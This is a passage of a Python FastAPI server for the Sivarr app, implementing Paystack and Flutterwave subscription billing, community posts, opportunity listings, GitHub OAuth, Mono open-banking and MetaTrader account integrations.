            "customizations": {"title": "Sivarr Organisation Plan",
                               "description": f"{seats} seats · {period}",
                               "logo": f"{BASE_URL}/static/logo.png"},
            "meta": {"kind": "org", "org_id": org["id"], "seats": seats,
                     "period": period, "sid": sid, "amount_ngn": charge_ngn},
        }
        try:
            async with _httpx.AsyncClient(timeout=15) as client:
                r = await client.post(f"{FLUTTERWAVE_API}/payments", json=payload,
                    headers={"Authorization": f"Bearer {FLUTTERWAVE_SECRET_KEY}",
                             "Content-Type": "application/json"})
            result = r.json()
        except Exception as exc:
            log.error(f"Org billing FLW init error: {exc}")
            raise HTTPException(502, "Flutterwave unreachable.")
        if result.get("status") != "success":
            raise HTTPException(400, result.get("message", "Payment init failed"))
        return {"payment_url": result["data"]["link"], "reference": ref,
                "seats": seats, "period": period, "amount_ngn": charge_ngn, "gateway": "flutterwave"}

    # ── Paystack (default) ──
    if not PAYSTACK_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Paystack not configured.")
    reference = f"sivorg_{uuid.uuid4().hex[:16]}"
    payload = {
        "email":        email or f"user_{sid}@sivarr.com",
        "amount":       charge_ngn * 100,
        "currency":     "NGN",
        "reference":    reference,
        "callback_url": f"{BASE_URL.rstrip('/')}/billing/callback",
        "metadata": {
            "sivarr_sid": sid, "kind": "org", "org_id": org["id"],
            "seats": seats, "period": period, "plan_name": "Org",
            "amount_ngn": charge_ngn,
        },
    }
    headers = {"Authorization": f"Bearer {PAYSTACK_SECRET_KEY}", "Content-Type": "application/json"}
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(f"{PAYSTACK_API}/transaction/initialize",
                                     json=payload, headers=headers)
        result = resp.json()
    except Exception as exc:
        log.error(f"Org billing subscribe error: {exc}")
        raise HTTPException(502, "Paystack API unreachable.")
    if not result.get("status"):
        raise HTTPException(400, result.get("message", "Paystack error."))
    return {
        "authorization_url": result["data"]["authorization_url"],
        "reference": reference, "seats": seats, "period": period,
        "amount_ngn": charge_ngn, "gateway": "paystack",
    }


@app.get("/api/billing/history")
async def billing_history(token: str = ""):
    """Return the user's billing payment history."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    return {"history": p.get("billing_history", [])}


@app.post("/api/billing/cancel")
async def billing_cancel(data: dict):
    """Cancel the user's active subscription (downgrades to free immediately)."""
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    sub = p.get("subscription", {})
    if not sub or sub.get("plan","free") == "free":
        raise HTTPException(400, "No active subscription to cancel.")
    sub["status"] = "cancelled"
    sub["cancelled_at"] = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    p["subscription"] = sub
    save_progress(sess["sid"], p)
    log.info(f"Billing cancelled: {sess['sid']}")
    return {"ok": True, "message": "Subscription cancelled. You keep access until the expiry date."}


# ═══════════════════════════════════════════════════════════════
#  COMMUNITY & OPPORTUNITIES
# ═══════════════════════════════════════════════════════════════

_comm_lock = threading.Lock()
_opp_lock  = threading.Lock()


# _load_json_file / _save_json_file now live in core.py (imported at the top).


@app.get("/api/community/posts")
async def community_get_posts(category: str = "all", limit: int = 40):
    ck = f"comm:{category}:{limit}"
    cached = _rc_get(ck)
    if cached is not None:
        return cached
    if db.is_available():
        posts = db.get_community_posts(category, limit)
    else:
        with _comm_lock:
            posts = _load_json_file(COMMUNITY_PATH, [])
        if category != "all":
            posts = [p for p in posts if p.get("category") == category]
        posts = posts[:limit]
    result = {"posts": posts}
    _rc_set(ck, result, ttl=30)
    return result


@app.post("/api/community/posts")
async def community_create_post(data: dict, request: Request):
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    check_rate_limit(get_client_key(request), 10, "community_post")
    body     = sanitize_text(str(data.get("body","")), 800)
    if len(body) < 3:
        raise HTTPException(400, "Post is too short.")
    category = sanitize_text(str(data.get("category","general")), 20)
    tags     = [sanitize_text(str(t), 30) for t in data.get("tags",[]) if t][:5]
    author   = sess.get("name", "Sivarr User")
    post_id  = uuid.uuid4().hex[:16]
    post = {
        "id": post_id, "author": author, "sid": sess["sid"],
        "body": body, "category": category, "tags": tags,
        "likes": [], "replies": [],
        "created": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if db.is_available():
        db.create_community_post(post_id, author, sess["sid"], body, category, tags)
    else:
        with _comm_lock:
            posts = _load_json_file(COMMUNITY_PATH, [])
            posts.insert(0, post)
            _save_json_file(COMMUNITY_PATH, posts[:200])
    _rc_bust("comm:")
    return {"ok": True, "post": post}


@app.delete("/api/community/posts/{post_id}")
async def community_delete_post(post_id: str, data: dict):
    sess = get_session_from_token(data.get("token", ""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    if db.is_available():
        conn = db._get_conn()
        if not conn:
            raise HTTPException(503, "Database unavailable.")
        try:
            with conn.cursor() as cur:
                cur.execute(
                    "DELETE FROM community_posts WHERE id = %s AND author_sid = %s",
                    (post_id, sid)
                )
                if cur.rowcount == 0:
                    raise HTTPException(403, "Post not found or not yours.")
            conn.commit()
        except HTTPException:
            raise
        except Exception as exc:
            conn.rollback()
            raise HTTPException(500, str(exc))
        finally:
            db._release(conn)
    else:
        with _comm_lock:
            posts = _load_json_file(COMMUNITY_PATH, [])
            post  = next((p for p in posts if p["id"] == post_id), None)
            if not post:
                raise HTTPException(404, "Post not found.")
            if post.get("sid") != sid:
                raise HTTPException(403, "You can only delete your own posts.")
            posts = [p for p in posts if p["id"] != post_id]
            _save_json_file(COMMUNITY_PATH, posts)
    _rc_bust("comm:")
    return {"ok": True}


@app.post("/api/community/posts/{post_id}/like")
async def community_like_post(post_id: str, data: dict):
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    if db.is_available():
        liked, count = db.toggle_community_like(post_id, sid)
        if count == 0 and not liked:
            raise HTTPException(404, "Post not found.")
    else:
        with _comm_lock:
            posts = _load_json_file(COMMUNITY_PATH, [])
            post  = next((p for p in posts if p["id"] == post_id), None)
            if not post:
                raise HTTPException(404, "Post not found.")
            likes = post.get("likes", [])
            if sid in likes:
                likes.remove(sid); liked = False
            else:
                likes.append(sid); liked = True
            post["likes"] = likes
            count = len(likes)
            _save_json_file(COMMUNITY_PATH, posts)
    _rc_bust("comm:")
    return {"ok": True, "liked": liked, "count": count}


@app.post("/api/community/posts/{post_id}/reply")
async def community_reply(post_id: str, data: dict):
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    body = sanitize_text(str(data.get("body","")), 400)
    if len(body) < 2:
        raise HTTPException(400, "Reply too short.")
    reply = {
        "id":      uuid.uuid4().hex[:12],
        "author":  sess.get("name","Sivarr User"),
        "sid":     sess["sid"],
        "body":    body,
        "created": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if db.is_available():
        ok = db.add_community_reply(post_id, reply)
        if not ok:
            raise HTTPException(404, "Post not found.")
    else:
        with _comm_lock:
            posts = _load_json_file(COMMUNITY_PATH, [])
            post  = next((p for p in posts if p["id"] == post_id), None)
            if not post:
                raise HTTPException(404, "Post not found.")
            post.setdefault("replies", []).append(reply)
            _save_json_file(COMMUNITY_PATH, posts)
    _rc_bust("comm:")
    return {"ok": True, "reply": reply}


@app.get("/api/opportunities")
async def get_opportunities_list(category: str = "all", limit: int = 50):
    ck = f"opp:{category}:{limit}"
    cached = _rc_get(ck)
    if cached is not None:
        return cached
    if db.is_available():
        opps = db.get_opportunities(category, limit)
    else:
        with _opp_lock:
            opps = _load_json_file(OPPORTUNITIES_PATH, [])
        if category != "all":
            opps = [o for o in opps if o.get("category") == category]
        opps = opps[:limit]
    result = {"opportunities": opps}
    _rc_set(ck, result, ttl=60)
    return result


@app.post("/api/opportunities")
async def submit_opportunity(data: dict, request: Request):
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    check_rate_limit(get_client_key(request), 5, "opportunity_post")
    title    = sanitize_text(str(data.get("title","")), 120)
    desc     = sanitize_text(str(data.get("desc","")), 600)
    link     = sanitize_text(str(data.get("link","")), 200)
    category = sanitize_text(str(data.get("category","other")), 20)
    deadline = sanitize_text(str(data.get("deadline","")), 20)
    org      = sanitize_text(str(data.get("organisation","")), 80)
    # location has always been a real column (database.py's `opportunities` table,
    # get_opportunities()/create_opportunity()) but this endpoint never read it —
    # every user-submitted listing silently got an empty location. Fixed here.
    location = sanitize_text(str(data.get("location","")), 80)
    if len(title) < 3:
        raise HTTPException(400, "Title required.")
    opp = {
        "id": uuid.uuid4().hex[:14], "title": title, "desc": desc, "link": link,
        "category": category, "deadline": deadline, "organisation": org,
        "location": location, "submitted_by": sess["sid"],
        "created": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if db.is_available():
        db.create_opportunity(opp)
    else:
        with _opp_lock:
            opps = _load_json_file(OPPORTUNITIES_PATH, [])
            opps.insert(0, opp)
            _save_json_file(OPPORTUNITIES_PATH, opps[:300])
    _rc_bust("opp:")
    return {"ok": True, "opportunity": opp}


@app.get("/api/profile/{sid_or_name}")
async def get_public_profile(sid_or_name: str):
    """Get a user's public profile by session ID or display name."""
    sid_or_name = sanitize_text(sid_or_name, 60)
    p = load_progress(sid_or_name)
    if not p.get("name"):
        raise HTTPException(404, "Profile not found.")
    sub    = p.get("subscription", {})
    plan   = sub.get("name","Free") if sub.get("status","") == "active" else "Free"
    joined = p.get("joined", p.get("created",""))
    return {
        "name":    p.get("name",""),
        "joined":  joined,
        "plan":    plan,
        "streak":  p.get("streak", 0),
        "xp":      p.get("xp", 0),
        "badges":  p.get("badges", []),
        "bio":     p.get("bio", ""),
    }


# ═══════════════════════════════════════════════════════════════
#  GITHUB INTEGRATION
# ═══════════════════════════════════════════════════════════════

@app.get("/auth/github")
async def github_oauth_start(token: str = ""):
    """Redirect to GitHub OAuth consent screen."""
    if not GITHUB_OAUTH_AVAILABLE:
        return RedirectResponse("/app?github_error=not_configured")
    _gh_sess = get_session_from_token(token)
    if _gh_sess and _integration_block(load_progress(_gh_sess["sid"]), "github"):
        return RedirectResponse("/app?github_error=plan_limit")
    from urllib.parse import urlencode
    params = {
        "client_id":   GITHUB_CLIENT_ID,
        "redirect_uri": f"{BASE_URL}/auth/github/callback",
        "scope":       "read:user user:email repo",
        "state":       token,
    }
    return RedirectResponse(f"{GITHUB_AUTH_URL}?{urlencode(params)}")


@app.get("/auth/github/callback")
async def github_oauth_callback(code: str = "", state: str = "", error: str = ""):
    """Exchange GitHub code, store access token, redirect back to app."""
    if error or not code:
        return RedirectResponse("/app?github_error=denied")
    if not GITHUB_OAUTH_AVAILABLE or not HTTPX_AVAILABLE:
        return RedirectResponse("/app?github_error=not_configured")

    sivarr_token = state
    sess = get_session_from_token(sivarr_token)
    if not sess:
        return RedirectResponse("/app?github_error=session_expired")

    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            tok = await client.post(GITHUB_TOKEN_URL,
                headers={"Accept": "application/json"},
                data={
                    "client_id":     GITHUB_CLIENT_ID,
                    "client_secret": GITHUB_CLIENT_SECRET,
                    "code":          code,
                    "redirect_uri":  f"{BASE_URL}/auth/github/callback",
                })
            tokens = tok.json()
            if "error" in tokens or "access_token" not in tokens:
                log.error(f"GitHub token error: {tokens}")
                return RedirectResponse("/app?github_error=token_failed")

            info = await client.get(f"{GITHUB_API}/user",
                headers={"Authorization": f"Bearer {tokens['access_token']}", "Accept": "application/json"})
            profile = info.json()
    except Exception as exc:
        log.error(f"GitHub OAuth error: {exc}")
        return RedirectResponse("/app?github_error=failed")

    sid = sess["sid"]
    p   = load_progress(sid)
    p["github_token"]    = tokens["access_token"]
    p["github_username"] = profile.get("login","")
    p["github_name"]     = profile.get("name","")
    p["github_avatar"]   = profile.get("avatar_url","")
    save_progress(sid, p)
    log.info(f"GitHub connected: {sid} → @{profile.get('login','')}")
    return RedirectResponse("/app?github_connected=1")


@app.get("/api/integrations/github/status")
async def github_status(token: str = ""):
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    return {
        "connected": bool(p.get("github_token")),
        "username":  p.get("github_username",""),
        "avatar":    p.get("github_avatar",""),
    }


@app.get("/api/integrations/github/repos")
async def github_repos(token: str = ""):
    """List the authenticated user's GitHub repos."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not HTTPX_AVAILABLE:
        raise HTTPException(503, "HTTP client unavailable.")
    p = load_progress(sess["sid"])
    gh_token = p.get("github_token","")
    if not gh_token:
        raise HTTPException(403, "GitHub not connected.")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(f"{GITHUB_API}/user/repos",
                headers={"Authorization": f"Bearer {gh_token}", "Accept": "application/json"},
                params={"sort": "pushed", "per_page": "30", "type": "owner"})
            data = resp.json()
    except Exception as exc:
        log.error(f"GitHub repos error: {exc}")
        raise HTTPException(502, "GitHub API unreachable.")
    if isinstance(data, dict) and "message" in data:
        raise HTTPException(403, data["message"])
    repos = [{"id": r["id"], "name": r["name"], "full_name": r["full_name"],
              "description": r.get("description","") or "",
              "private": r["private"], "language": r.get("language",""),
              "stars": r["stargazers_count"], "pushed": r["pushed_at"],
              "url": r["html_url"]} for r in (data or [])]
    return {"repos": repos}


@app.get("/api/integrations/github/activity")
async def github_activity(token: str = "", repo: str = ""):
    """Get recent commits + open PRs for a repo (owner/name format)."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not HTTPX_AVAILABLE:
        raise HTTPException(503, "HTTP client unavailable.")
    repo = sanitize_text(repo, 120)
    if not repo or "/" not in repo:
        raise HTTPException(400, "repo must be owner/name format.")
    p = load_progress(sess["sid"])
    gh_token = p.get("github_token","")
    if not gh_token:
        raise HTTPException(403, "GitHub not connected.")
    headers = {"Authorization": f"Bearer {gh_token}", "Accept": "application/json"}
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            commits_r, prs_r = await asyncio.gather(
                client.get(f"{GITHUB_API}/repos/{repo}/commits",
                    headers=headers, params={"per_page": "10"}),
                client.get(f"{GITHUB_API}/repos/{repo}/pulls",
                    headers=headers, params={"state": "open", "per_page": "10"}),
            )
            commits = commits_r.json() if commits_r.status_code == 200 else []
            prs     = prs_r.json()     if prs_r.status_code == 200 else []
    except Exception as exc:
        log.error(f"GitHub activity error: {exc}")
        raise HTTPException(502, "GitHub API unreachable.")
    return {
        "commits": [{"sha": c["sha"][:7], "message": c["commit"]["message"].split("\n")[0][:80],
                     "author": c["commit"]["author"]["name"], "date": c["commit"]["author"]["date"],
                     "url": c["html_url"]} for c in (commits if isinstance(commits, list) else [])],
        "prs":     [{"number": pr["number"], "title": pr["title"][:80],
                     "author": pr["user"]["login"], "created": pr["created_at"],
                     "url": pr["html_url"]} for pr in (prs if isinstance(prs, list) else [])],
    }


# ═══════════════════════════════════════════════════════════════
#  FLUTTERWAVE BILLING
# ═══════════════════════════════════════════════════════════════

@app.post("/api/billing/flutterwave/subscribe")
async def flutterwave_subscribe(data: dict):
    """Initialize a Flutterwave payment for a Sivarr plan."""
    token = data.get("token","")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not FLUTTERWAVE_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Flutterwave not configured.")
    plan_id = sanitize_text(data.get("plan_id",""), 40)
    plan    = SIVARR_PLANS.get(plan_id)
    if not plan:
        raise HTTPException(400, "Invalid plan.")
    sid = sess["sid"]
    p   = load_progress(sid)
    email = p.get("email","")
    name  = p.get("name","User")
    ref   = f"FLW-SIVARR-{sid[:8].upper()}-{int(time.time())}"
    amount_ngn = plan_charge_ngn(plan)   # USD anchor → NGN at the current live rate
    payload = {
        "tx_ref":       ref,
        "amount":       str(amount_ngn),
        "currency":     "NGN",
        "redirect_url": f"{BASE_URL.rstrip('/')}/app?flw_billing=success&ref={ref}&plan={plan_id}",
        "customer":     {"email": email, "name": name},
        "customizations": {
            "title":       f"Sivarr {plan['name']} Plan",
            "description": f"{plan['label']} subscription",
            "logo":        f"{BASE_URL}/static/logo.png",
        },
        "meta": {"plan_id": plan_id, "sid": sid},
    }
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            r = await client.post(
                f"{FLUTTERWAVE_API}/payments",
                json=payload,
                headers={"Authorization": f"Bearer {FLUTTERWAVE_SECRET_KEY}",
                         "Content-Type": "application/json"},
            )
            result = r.json()
    except Exception as exc:
        log.error(f"Flutterwave init error: {exc}")
        raise HTTPException(502, "Flutterwave unreachable.")
    if result.get("status") != "success":
        raise HTTPException(400, result.get("message","Payment init failed"))
    return {
        "payment_url": result["data"]["link"],
        "reference":   ref,
        "amount_ngn":  amount_ngn,
        "plan":        plan,
    }


@app.get("/api/billing/flutterwave/verify/{reference}")
async def flutterwave_verify(reference: str, token: str = "", plan_id: str = ""):
    """Verify Flutterwave payment and activate subscription."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not FLUTTERWAVE_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Flutterwave not configured.")
    reference = sanitize_text(reference, 80)
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            r = await client.get(
                f"{FLUTTERWAVE_API}/transactions/verify_by_reference",
                params={"tx_ref": reference},
                headers={"Authorization": f"Bearer {FLUTTERWAVE_SECRET_KEY}"},
            )
            result = r.json()
    except Exception as exc:
        log.error(f"Flutterwave verify error: {exc}")
        raise HTTPException(502, "Flutterwave unreachable.")
    if result.get("status") != "success" or result["data"]["status"] != "successful":
        raise HTTPException(400, "Payment not completed.")
    data = result["data"]
    meta = data.get("meta", {}) or {}

    # Bind to the authenticated user, and IGNORE the client-supplied plan_id query
    # param — use the server-set tx metadata. (The param let a user pay for the
    # cheapest plan and claim the most expensive via ?plan_id=.)
    if meta.get("sid") and meta.get("sid") != sess["sid"]:
        raise HTTPException(403, "This payment belongs to a different account.")
    sid = sess["sid"]

    # Org seat subscriptions are applied to the org, not the user's personal plan.
    if meta.get("kind") == "org" and meta.get("org_id"):
        return await _billing_apply_org_flutterwave(sid, meta, data, reference)

    meta_plan = meta.get("plan_id", "")
    plan = SIVARR_PLANS.get(meta_plan)
    if not plan:
        log.error(f"Flutterwave verify: unknown plan_id {meta_plan!r} ref={reference}")
        raise HTTPException(400, "Could not determine the plan for this payment.")
    plan_id = meta_plan

    # Verify the amount paid covers the plan (Flutterwave amount is in the major
    # unit, e.g. NGN — not kobo).
    try:
        paid = float(data.get("amount", 0) or 0)
    except (TypeError, ValueError):
        paid = 0.0
    # Expected NGN = what we locked at initialize (FX-stable); fall back to a live
    # recompute only if the metadata is missing.
    expected_ngn = int(meta.get("amount_ngn") or plan_charge_ngn(plan))
    if (data.get("currency") or "").upper() != "NGN" or paid < expected_ngn:
        log.warning(f"Flutterwave verify amount mismatch ref={reference}: paid {paid} "
                    f"{data.get('currency')}, need {expected_ngn} NGN for {plan_id}")
        raise HTTPException(400, "Payment amount does not match the selected plan.")

    p = load_progress(sid)
    # Idempotency — don't re-apply a reference already in billing history.
    if any(h.get("reference") == reference for h in p.get("billing_history", [])):
        return {"ok": True, "plan": p.get("subscription", {}), "idempotent": True}

    expires = (datetime.datetime.utcnow() + datetime.timedelta(
        days=365 if plan.get("period") == "yearly" else 32
    )).strftime("%Y-%m-%d")
    now_str = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    p["subscription"] = {
        "plan":    plan_id,
        "name":    plan["name"],
        "status":  "active",
        "expires": expires,
        "gateway": "flutterwave",
        "reference": reference,
        "activated": now_str,
    }
    history = p.get("billing_history", [])
    history.insert(0, {
        "date": now_str,
        "plan": plan["name"],
        "amount": f"₦{plan['amount_ngn']:,}",
        "reference": reference,
        "gateway": "flutterwave",
        "status": "paid",
    })
    p["billing_history"] = history[:20]
    save_progress(sid, p)
    email = p.get("email","")
    name  = p.get("name","User")
    if email:
        send_email(email, f"Sivarr {plan['name']} · Payment Confirmed",
                   _email_billing_receipt_html(name, plan["name"],
                       f"₦{plan['amount_ngn']:,}", reference))
    return {"ok": True, "plan": p["subscription"]}


# ═══════════════════════════════════════════════════════════════
#  MONO INTEGRATION (Open Banking)
# ═══════════════════════════════════════════════════════════════

@app.post("/api/integrations/mono/auth")
async def mono_auth(data: dict):
    """Exchange a Mono Connect code for an account_id and fetch account details."""
    token = data.get("token","")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not MONO_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Mono not configured.")
    _mono_p = load_progress(sess["sid"])
    if _integration_block(_mono_p, "mono"):
        raise HTTPException(402, _integration_limit_msg(_mono_p))
    code = sanitize_text(data.get("code",""), 80)
    if not code:
        raise HTTPException(400, "code required.")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            r = await client.post(
                f"{MONO_API}/v2/accounts/auth",
                json={"code": code},
                headers={"mono-sec-key": MONO_SECRET_KEY, "Content-Type": "application/json"},
            )
            result = r.json()
    except Exception as exc:
        log.error(f"Mono auth error: {exc}")
        raise HTTPException(502, "Mono unreachable.")
    if r.status_code != 200:
        raise HTTPException(400, result.get("message","Mono auth failed"))
    account_id = result.get("id") or result.get("account_id","")
    sid = sess["sid"]
    p   = load_progress(sid)
    p["mono_account_id"] = account_id
    save_progress(sid, p)
    return {"ok": True, "account_id": account_id}


@app.get("/api/integrations/mono/account")
async def mono_account(token: str = ""):
    """Get Mono account details and recent transactions."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not MONO_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Mono not configured.")
    sid = sess["sid"]
    p   = load_progress(sid)
    account_id = p.get("mono_account_id","")
    if not account_id:
        raise HTTPException(403, "Mono not connected.")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            acc_r, txn_r = await asyncio.gather(
                client.get(f"{MONO_API}/v2/accounts/{account_id}",
                    headers={"mono-sec-key": MONO_SECRET_KEY}),
                client.get(f"{MONO_API}/v2/accounts/{account_id}/transactions",
                    headers={"mono-sec-key": MONO_SECRET_KEY},
                    params={"limit": "20", "period": "last3months"}),
            )
            account      = acc_r.json() if acc_r.status_code == 200 else {}
            transactions = txn_r.json() if txn_r.status_code == 200 else {}
    except Exception as exc:
        log.error(f"Mono account fetch error: {exc}")
        raise HTTPException(502, "Mono unreachable.")
    return {
        "account":      account,
        "transactions": transactions.get("data",[]) if isinstance(transactions, dict) else [],
    }


@app.get("/api/integrations/mono/status")
async def mono_status(token: str = ""):
    """Return whether this user has connected a Mono bank account."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    return {"connected": bool(p.get("mono_account_id",""))}


# ═══════════════════════════════════════════════════════════════
#  METATRADER (via MetaApi.cloud bridge)
# ═══════════════════════════════════════════════════════════════

def _metaapi_headers():
    return {"auth-token": METAAPI_TOKEN, "Content-Type": "application/json"}


@app.post("/api/integrations/metatrader/connect")
async def metatrader_connect(data: dict):
    """Provision the user's MT4/MT5 account on MetaApi and store the read-only handle.

    The broker password is forwarded to MetaApi once (it stores it) and is NEVER
    persisted on our side. We keep only the MetaApi account id + region + the
    non-secret login/server/platform for display and subsequent data pulls.
    """
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not METAAPI_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "MetaTrader integration not configured.")
    _mt_p = load_progress(sess["sid"])
    if _integration_block(_mt_p, "metatrader"):
        raise HTTPException(402, _integration_limit_msg(_mt_p))

    login    = sanitize_text(str(data.get("login", "")), 40)
    server   = sanitize_text(str(data.get("server", "")), 120)
    platform = sanitize_text(str(data.get("platform", "mt5")), 8).lower()
    password = str(data.get("password", ""))  # forwarded as-is, never stored/sanitized away
    name     = sanitize_text(str(data.get("name", "")), 60) or f"MT-{login}"
    if platform not in ("mt4", "mt5"):
        platform = "mt5"
    if not login or not server or not password:
        raise HTTPException(400, "login, password and server are required.")

    payload = {
        "name": name,
        "type": "cloud-g2",
        "login": login,
        "password": password,
        "server": server,
        "platform": platform,
        "magic": 0,
        "application": "Sivarr",
        "region": METAAPI_REGION,
    }
    try:
        async with _httpx.AsyncClient(timeout=30) as client:
            r = await client.post(
                f"{METAAPI_PROVISION}/users/current/accounts",
                json=payload, headers=_metaapi_headers(),
            )
            result = r.json() if r.content else {}
    except Exception as exc:
        log.error(f"MetaApi connect error: {exc}")
        raise HTTPException(502, "MetaApi unreachable.")
    if r.status_code not in (200, 201):
        msg = (result or {}).get("message") or "MetaApi rejected the account credentials."
        raise HTTPException(400, msg)

    account_id = result.get("id") or result.get("_id", "")
    if not account_id:
        raise HTTPException(502, "MetaApi did not return an account id.")

    # Resolve the deploy region for the client-API host (defensive: fall back to default).
    region = METAAPI_REGION
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            ar = await client.get(
                f"{METAAPI_PROVISION}/users/current/accounts/{account_id}",
                headers=_metaapi_headers(),
            )
            if ar.status_code == 200:
                region = (ar.json() or {}).get("region", region) or region
    except Exception:
        pass

    sid = sess["sid"]
    p = load_progress(sid)
    p["metaapi_account_id"] = account_id
    p["metaapi_region"]     = region
    p["mt_login"]           = login
    p["mt_server"]          = server
    p["mt_platform"]        = platform
    save_progress(sid, p)
    # The account takes ~1-5 min to deploy + sync. Frontend polls /account.
    return {"ok": True, "account_id": account_id, "state": result.get("state", "DEPLOYING")}


@app.get("/api/integrations/metatrader/status")
async def metatrader_status(token: str = ""):
    """Return whether this user has linked a MetaTrader account (+ display meta)."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    return {
        "available": METAAPI_AVAILABLE,
        "connected": bool(p.get("metaapi_account_id", "")),
        "login":     p.get("mt_login", ""),
        "server":    p.get("mt_server", ""),
        "platform":  p.get("mt_platform", ""),
    }


def _mt_norm_position(pos: dict) -> dict:
    t = str(pos.get("type", "")).upper()
    return {
        "id":        pos.get("id", ""),
        "symbol":    pos.get("symbol", ""),
        "type":      "buy" if "BUY" in t else "sell" if "SELL" in t else t.lower(),
        "volume":    pos.get("volume", 0),
        "openPrice": pos.get("openPrice", 0),
        "current":   pos.get("currentPrice", 0),
        "profit":    pos.get("profit", 0),
        "swap":      pos.get("swap", 0),
        "time":      pos.get("time", ""),
    }


def _mt_norm_deal(deal: dict) -> dict:
    t = str(deal.get("type", "")).upper()
    return {
        "id":      deal.get("id", ""),
        "symbol":  deal.get("symbol", ""),
        "type":    "buy" if "BUY" in t else "sell" if "SELL" in t else t.lower(),
        "entry":   str(deal.get("entryType", "")).replace("DEAL_ENTRY_", "").lower(),  # in|out
        "volume":  deal.get("volume", 0),
        "price":   deal.get("price", 0),
        "profit":  deal.get("profit", 0),
        "swap":    deal.get("swap", 0),
        "commission": deal.get("commission", 0),
        "time":    deal.get("time", ""),
    }


@app.get("/api/integrations/metatrader/account")
async def metatrader_account(token: str = "", days: int = 90):
    """Fetch live account info, open positions and recent closed deals from MetaApi.

    Returns a normalized shape the Trading Journal extension can visualize. While the
    account is still deploying/syncing the client API 404/503s — we surface that as a
    'pending' state rather than an error so the UI can poll.
    """
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not METAAPI_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "MetaTrader integration not configured.")
    p = load_progress(sess["sid"])
    account_id = p.get("metaapi_account_id", "")
    if not account_id:
        raise HTTPException(403, "MetaTrader not connected.")
    region = p.get("metaapi_region", METAAPI_REGION)
    host   = _metaapi_client_host(region)
    base   = f"{host}/users/current/accounts/{account_id}"
    days   = max(1, min(int(days or 90), 365))
    end    = datetime.datetime.utcnow()
    start  = end - datetime.timedelta(days=days)
    fmt    = "%Y-%m-%dT%H:%M:%S.000Z"
    headers = {"auth-token": METAAPI_TOKEN}
    try:
        async with _httpx.AsyncClient(timeout=20) as client:
            info_r, pos_r, deals_r = await asyncio.gather(
                client.get(f"{base}/account-information", headers=headers),
                client.get(f"{base}/positions", headers=headers),
                client.get(
                    f"{base}/history-deals/time/{start.strftime(fmt)}/{end.strftime(fmt)}",
                    headers=headers),
                return_exceptions=True,
            )
    except Exception as exc:
        log.error(f"MetaApi account fetch error: {exc}")
        raise HTTPException(502, "MetaApi unreachable.")

    def _ok(resp):
        return (not isinstance(resp, Exception)) and getattr(resp, "status_code", 0) == 200

    if not _ok(info_r):
        # Still deploying / connecting to broker, or transient — let the UI poll.
        return {"connected": True, "state": "pending",
                "login": p.get("mt_login", ""), "server": p.get("mt_server", ""),
                "platform": p.get("mt_platform", "")}

    info  = info_r.json() or {}
    positions = pos_r.json() if _ok(pos_r) else []
    deals     = deals_r.json() if _ok(deals_r) else []
    if isinstance(deals, dict):
        deals = deals.get("deals") or deals.get("data") or []

    return {
        "connected": True,
        "state": "ready",
        "login": p.get("mt_login", ""),
        "server": p.get("mt_server", ""),
        "platform": p.get("mt_platform", ""),
        "info": {
            "name":       info.get("name", ""),
            "balance":    info.get("balance", 0),
            "equity":     info.get("equity", 0),
            "margin":     info.get("margin", 0),
            "freeMargin": info.get("freeMargin", 0),
            "marginLevel": info.get("marginLevel", 0),
            "leverage":   info.get("leverage", 0),
            "currency":   info.get("currency", ""),
        },
